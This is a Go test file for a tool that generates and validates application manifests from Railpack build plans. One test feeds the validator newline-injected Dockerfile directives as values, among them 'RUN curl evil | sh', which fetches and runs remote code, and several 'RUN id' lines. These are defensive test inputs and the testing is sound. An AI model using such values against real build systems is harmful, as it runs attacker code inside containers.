package definition

import (
	"bytes"
	"reflect"
	"strings"
	"testing"

	"github.com/railwayapp/railpack/core"
	"github.com/railwayapp/railpack/core/plan"
	"github.com/railwayapp/railpack/core/resolver"

	"shed/internal/diag"
)

func TestRailpackGeneratorProducesCompleteDeterministicManifest(t *testing.T) {
	version := "24.1.0"
	result := &core.BuildResult{
		Success:           true,
		DetectedProviders: []string{"node"},
		Plan: &plan.BuildPlan{
			Steps:  []plan.Step{{Name: "build", Commands: []plan.Command{plan.NewExecCommand("pnpm run build")}}},
			Deploy: plan.Deploy{StartCmd: "pnpm run start", Variables: map[string]string{"PORT": "3000"}},
		},
		Metadata: map[string]string{"nodePackageManager": "pnpm", "nodeRuntime": "next"},
		ResolvedPackages: map[string]*resolver.ResolvedPackage{
			"node": {Name: "node", ResolvedVersion: &version},
		},
	}
	input := GenerationInput{Files: []string{"app/page.tsx", "next.config.mjs", "package.json", "pnpm-lock.yaml", "public/logo.svg"}, Build: result, Name: "site"}
	first, err := (RailpackGenerator{}).Generate(input)
	if err != nil {
		t.Fatal(err)
	}
	second, err := (RailpackGenerator{}).Generate(input)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(first.Source, second.Source) {
		t.Fatalf("generated %s is not deterministic:\n%s\n%s", ManifestFileName, first.Source, second.Source)
	}
	if first.Manifest.Build.Image != "node:24" || first.Manifest.Run.Port != 3000 {
		t.Fatalf("definition = %#v", first.Manifest)
	}
	part := first.Manifest.Parts["app"]
	app := first.Manifest.Apps["web"]
	if first.Manifest.Base != "node-24" || part.Plugin != "nextjs" ||
		part.Dependencies.Manager != "pnpm" || app.Command[0] != "node" ||
		app.Args[0] != "server.js" {
		t.Fatalf("remote builder recipe = base %q, part %#v, app %#v",
			first.Manifest.Base, part, app)
	}
	if len(first.Manifest.Build.Commands) != 3 || first.Manifest.Build.Commands[2][2] != "build" {
		t.Fatalf("build commands = %#v", first.Manifest.Build.Commands)
	}
	source := string(first.Source)
	if !strings.HasPrefix(source, `application "site" {`) {
		t.Fatalf("generated %s = %s", ManifestFileName, source)
	}
	if !strings.Contains(source, `base = "node-24"`) ||
		!strings.Contains(source, `part "app" {`) ||
		!strings.Contains(source, `app "web" {`) {
		t.Fatalf("generated %s lacks remote builder recipe: %s", ManifestFileName, source)
	}
	reparsed, err := ParseManifest(first.Source)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(reparsed, first.Manifest) {
		t.Fatalf("%s does not round-trip:\n%#v\n%#v", ManifestFileName, reparsed, first.Manifest)
	}
}

// A generation without a name is a manifest that cannot be written yet: the
// caller names it, and Source stays empty until then.
func TestGenerateWithoutANameLeavesSourceEmpty(t *testing.T) {
	_, input := goBuildResult("1.24", "go.mod", "cmd/server/main.go")
	generated, err := (RailpackGenerator{}).Generate(input)
	if err != nil {
		t.Fatal(err)
	}
	if generated.Manifest.Metadata != nil || generated.Source != nil {
		t.Fatalf("generated = %#v", generated)
	}
	if _, err := generated.Manifest.Marshal(); err == nil {
		t.Fatal("a nameless manifest marshalled")
	}
}

// The file is strict: an attribute the schema does not declare, a second
// application block, or a shell string where argv belongs all fail to parse,
// and every failure names the file.
func TestParseManifestRejectsWhatTheSchemaDoesNotDeclare(t *testing.T) {
	valid := `application "api" {
  content {
    include = ["main.go", "go.mod"]
  }
  build {
    image = "golang:1.26"
  }
  run {
    command = ["./out"]
    port    = 8080
  }
}
`
	if _, err := ParseManifest([]byte(valid)); err != nil {
		t.Fatalf("a valid file failed: %v", err)
	}
	for name, mutate := range map[string]func(string) string{
		"unknown attribute": func(s string) string { return strings.Replace(s, "port    = 8080", "port = 8080\n    ports = 1", 1) },
		"unknown block":     func(s string) string { return strings.Replace(s, "  run {", "  static {}\n  run {", 1) },
		"shell command":     func(s string) string { return strings.Replace(s, `command = ["./out"]`, `command = "./out"`, 1) },
		"two applications":  func(s string) string { return s + valid },
		"bad name":          func(s string) string { return strings.Replace(s, `"api"`, `"Not Valid"`, 1) },
		"no name":           func(s string) string { return strings.Replace(s, `application "api" {`, `application {`, 1) },
		"yaml":              func(string) string { return "apiVersion: shed.run/v1alpha1\nkind: Application\n" },
	} {
		_, err := ParseManifest([]byte(mutate(valid)))
		if err == nil {
			t.Errorf("%s: parsed without error", name)
		} else if !strings.Contains(err.Error(), ManifestFileName) && !strings.Contains(err.Error(), "name") {
			t.Errorf("%s: error does not name the file: %v", name, err)
		}
	}
}

func goBuildResult(version string, files ...string) (*core.BuildResult, GenerationInput) {
	result := &core.BuildResult{
		Success:           true,
		DetectedProviders: []string{"golang"},
		Plan: &plan.BuildPlan{
			Steps: []plan.Step{
				{Name: "install", Commands: []plan.Command{plan.NewExecCommand("go mod download")}},
				{Name: "build", Commands: []plan.Command{plan.NewExecCommand(`go build -ldflags="-w -s" -o out ./cmd/server`)}},
			},
			Deploy: plan.Deploy{StartCmd: "./out"},
		},
		Metadata: map[string]string{"goMod": "true"},
	}
	if version != "" {
		result.ResolvedPackages = map[string]*resolver.ResolvedPackage{
			"go": {Name: "go", RequestedVersion: &version},
		}
	}
	return result, GenerationInput{Files: files, Build: result}
}

func TestRailpackGeneratorLowersGoModuleIntoBuildAndRun(t *testing.T) {
	_, input := goBuildResult("1.24.2", "go.mod", "go.sum", "cmd/server/main.go", "internal/api/handler.go")

	generated, err := (RailpackGenerator{}).Generate(input)
	if err != nil {
		t.Fatal(err)
	}

	manifest := generated.Manifest
	if manifest.Build.Image != "golang:1.24" {
		t.Fatalf("image = %q", manifest.Build.Image)
	}
	wantCommands := [][]string{
		{"go", "mod", "download"},
		{"go", "build", "-ldflags=-w -s", "-o", "out", "./cmd/server"},
	}
	if !reflect.DeepEqual(manifest.Build.Commands, wantCommands) {
		t.Fatalf("commands = %#v", manifest.Build.Commands)
	}
	if !reflect.DeepEqual(manifest.Run.Command, []string{"./out"}) {
		t.Fatalf("run command = %#v", manifest.Run.Command)
	}
	// go.mod and go.sum pin the dependency graph; everything else is staged.
	if !reflect.DeepEqual(manifest.Content.Include, []string{"cmd", "go.mod", "go.sum", "internal"}) {
		t.Fatalf("include = %#v", manifest.Content.Include)
	}
	// NODE_ENV belongs to the Node lowering and must not leak into other families.
	if _, present := manifest.Run.Environment["NODE_ENV"]; present {
		t.Fatalf("environment = %#v", manifest.Run.Environment)
	}
	if manifest.Run.Environment["PORT"] != "8080" || manifest.Run.Port != 8080 {
		t.Fatalf("environment = %#v, port = %d", manifest.Run.Environment, manifest.Run.Port)
	}
}

// go.mod may pin a patch release that Docker Hub never tagged an image for.
func TestGoImageTagNarrowsToTheMinorLine(t *testing.T) {
	for _, testCase := range []struct{ requested, want string }{
		{"1.26.3", "golang:1.26"},
		{"1.24", "golang:1.24"},
		{"", "golang:1.25"},
		{"tip", "golang:1.25"},
	} {
		_, input := goBuildResult(testCase.requested, "go.mod", "cmd/server/main.go")
		generated, err := (RailpackGenerator{}).Generate(input)
		if err != nil {
			t.Fatal(err)
		}
		if generated.Manifest.Build.Image != testCase.want {
			t.Fatalf("requested %q gave image %q, want %q", testCase.requested, generated.Manifest.Build.Image, testCase.want)
		}
	}
}

// The diagnostic code is the contract agents branch on, so assert it rather than
// the wording, which is free to improve.
func requireDiagnosticCode(t *testing.T, err error, want string) {
	t.Helper()
	diagnostic, ok := diag.As(err)
	if !ok {
		t.Fatalf("err = %v, want a diagnostic with code %q", err, want)
	}
	if diagnostic.Code != want {
		t.Fatalf("code = %q, want %q (%v)", diagnostic.Code, want, err)
	}
	if len(diagnostic.Hints) == 0 {
		t.Fatalf("diagnostic %q carries no next step", want)
	}
}

func TestRailpackGeneratorRejectsGoProjectsItCannotBuild(t *testing.T) {
	// Railpack detects Go from a lone main.go, but a build with no module has no
	// reproducible dependency graph to package.
	_, moduleless := goBuildResult("1.24", "main.go")
	_, err := (RailpackGenerator{}).Generate(moduleless)
	requireDiagnosticCode(t, err, "missing_go_mod")

	_, workspace := goBuildResult("1.24", "go.work", "api/go.mod", "api/main.go")
	_, err = (RailpackGenerator{}).Generate(workspace)
	requireDiagnosticCode(t, err, "unsupported_project")

	// Without a build command the start command names a binary nothing produces.
	result, input := goBuildResult("1.24", "go.mod", "main.go")
	result.Plan.Steps = []plan.Step{{Name: "install", Commands: []plan.Command{plan.NewExecCommand("go mod download")}}}
	_, err = (RailpackGenerator{}).Generate(input)
	requireDiagnosticCode(t, err, "no_build_command")
}

func TestRailpackGeneratorOmitsRemoteRecipeOutsideCatalog(t *testing.T) {
	version := "22.1.0"
	generated, err := (RailpackGenerator{}).Generate(GenerationInput{
		Files: []string{"package.json", "package-lock.json", "src/server.js"},
		Build: &core.BuildResult{
			Success:           true,
			DetectedProviders: []string{"node"},
			Plan: &plan.BuildPlan{
				Deploy: plan.Deploy{StartCmd: "node src/server.js"},
			},
			Metadata: map[string]string{"nodePackageManager": "npm"},
			ResolvedPackages: map[string]*resolver.ResolvedPackage{
				"node": {Name: "node", ResolvedVersion: &version},
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if generated.Manifest.Base != "" || len(generated.Manifest.Parts) != 0 ||
		len(generated.Manifest.Apps) != 0 {
		t.Fatalf("unexpected remote recipe: %#v", generated.Manifest)
	}
}

func TestRemoteRecipeRequiresDirectGenericNodeLaunch(t *testing.T) {
	recipe, err := remoteBuilderRecipe(
		"pnpm",
		"",
		[]string{"package.json", "pnpm-lock.yaml"},
		[]string{"src"},
		[]string{"pnpm", "run", "start"},
		map[string]string{"PORT": "8080"},
		8080,
	)
	if err != nil {
		t.Fatal(err)
	}
	if recipe.base != "" || len(recipe.parts) != 0 || len(recipe.apps) != 0 {
		t.Fatalf("package-manager launch unexpectedly produced a remote recipe: %#v", recipe)
	}
}

func TestRailpackGeneratorRejectsUnsupportedProvider(t *testing.T) {
	_, err := (RailpackGenerator{}).Generate(GenerationInput{Build: &core.BuildResult{Success: true, DetectedProviders: []string{"python"}, Plan: &plan.BuildPlan{}}})
	if err == nil || !strings.Contains(err.Error(), "python") {
		t.Fatalf("err = %v", err)
	}
}

func TestSplitCommandRejectsShellOperators(t *testing.T) {
	if _, err := splitCommand("node server.js | tee output"); err == nil {
		t.Fatal("expected shell operator rejection")
	}
	got, err := splitCommand(`node "dist/server file.js"`)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[1] != "dist/server file.js" {
		t.Fatalf("words = %#v", got)
	}
}

func TestProjectNamePrecedenceAndInference(t *testing.T) {
	manifest := Manifest{Metadata: &ManifestMetadata{Name: "manifest-name"}}
	if got, err := ProjectName("/tmp/Directory Name", "explicit-name", manifest); err != nil || got != "explicit-name" {
		t.Fatalf("explicit name = %q, %v", got, err)
	}
	if got, err := ProjectName("/tmp/Directory Name", "", manifest); err != nil || got != "manifest-name" {
		t.Fatalf("manifest name = %q, %v", got, err)
	}
	manifest.Metadata = nil
	if got, err := ProjectName("/tmp/Directory Name", "", manifest); err != nil || got != "directory-name" {
		t.Fatalf("inferred name = %q, %v", got, err)
	}
}

func TestManifestRejectsInvalidProjectName(t *testing.T) {
	manifest := Manifest{
		APIVersion: ManifestAPIVersion,
		Kind:       ManifestKind,
		Metadata:   &ManifestMetadata{Name: "Not Valid"},
		Content:    ManifestContent{Include: []string{"index.js"}},
		Build:      ManifestBuild{Image: "node:22"},
		Run:        ManifestRun{Command: []string{"node", "index.js"}, Port: 3000},
	}
	if err := manifest.Validate(); err == nil {
		t.Fatal("expected metadata.name validation failure")
	}
}

// The generated Dockerfile concatenates these fields into directives, so a
// line break in any of them would inject directives the manifest never
// declared. Validate must stop that at parse time.
func TestManifestRejectsDockerfileInjection(t *testing.T) {
	valid := func() Manifest {
		return Manifest{
			APIVersion: ManifestAPIVersion,
			Kind:       ManifestKind,
			Content:    ManifestContent{Include: []string{"index.js"}},
			Build:      ManifestBuild{Image: "node:22"},
			Run:        ManifestRun{Command: []string{"node", "index.js"}, Port: 3000},
		}
	}
	cases := map[string]func(*Manifest){
		"workingDirectory": func(m *Manifest) { m.Run.WorkingDirectory = "/app\nRUN curl evil | sh" },
		"user":             func(m *Manifest) { m.Run.User = "root\nRUN id" },
		"stopSignal":       func(m *Manifest) { m.Run.StopSignal = "SIGTERM\nRUN id" },
		"environment key":  func(m *Manifest) { m.Run.Environment = map[string]string{"A\nRUN id": "v"} },
	}
	for name, corrupt := range cases {
		manifest := valid()
		corrupt(&manifest)
		if err := manifest.Validate(); err == nil {
			t.Errorf("a newline in run.%s passed validation", name)
		}
	}
	clean := valid()
	clean.Run.WorkingDirectory = "/srv/app"
	clean.Run.User = "1000:1000"
	clean.Run.StopSignal = "SIGINT"
	clean.Run.Environment = map[string]string{"NODE_ENV": "production"}
	if err := clean.Validate(); err != nil {
		t.Fatalf("a clean manifest failed validation: %v", err)
	}
}
